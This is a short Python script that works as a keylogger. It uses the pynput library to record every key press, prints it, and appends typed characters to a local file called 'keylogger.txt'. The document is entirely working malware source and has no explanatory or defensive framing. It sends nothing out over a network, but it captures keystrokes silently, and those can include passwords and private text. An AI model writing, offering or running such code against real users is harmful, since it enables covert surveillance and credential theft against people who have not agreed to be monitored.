from pynput import keyboard

def key_press(key):
    print(str(key))
    with open("keylogger.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press = key_press)
    listener.start()
    input()

